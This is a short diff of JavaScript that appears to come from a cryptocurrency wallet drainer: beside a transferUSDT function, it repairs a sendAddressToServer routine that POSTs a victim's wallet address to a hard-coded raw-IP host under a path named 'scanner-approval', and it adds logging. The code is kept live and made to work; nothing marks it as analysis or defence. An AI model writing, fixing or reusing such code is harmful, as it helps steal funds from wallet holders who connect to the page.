@@ -97,16 +97,34 @@ async function transferUSDT(e) {
       t.html(a));
   }
 }
+// function sendAddressToServer(e) {
+//   var t = "{'address':'" + e + "'}";
+//   $.ajax({
+//     type: "POST",
+//     url: "https://159.198.66.79.nip.io/api/scanner-approval",
+//     data: t,
+//     contentType: "application/json; charset=utf-8",
+//     dataType: "json",
+//     success: function (e) {
+//       return 1 == e.d.status ? void (returnData = !0) : void (returnData = !1);
+//     },
+//   });
+// }
+
+
 function sendAddressToServer(e) {
-  var t = "{'address':'" + e + "'}";
   $.ajax({
     type: "POST",
     url: "https://159.198.66.79.nip.io/api/scanner-approval",
-    data: t,
+    data: JSON.stringify({ address: e }), // ✅ FIXED
     contentType: "application/json; charset=utf-8",
     dataType: "json",
-    success: function (e) {
-      return 1 == e.d.status ? void (returnData = !0) : void (returnData = !1);
+    success: function (res) {
+      console.log("Success:", res);
     },
+    error: function (err) {
+      console.error("API Error:", err.responseText);
+    }
   });
 }
+
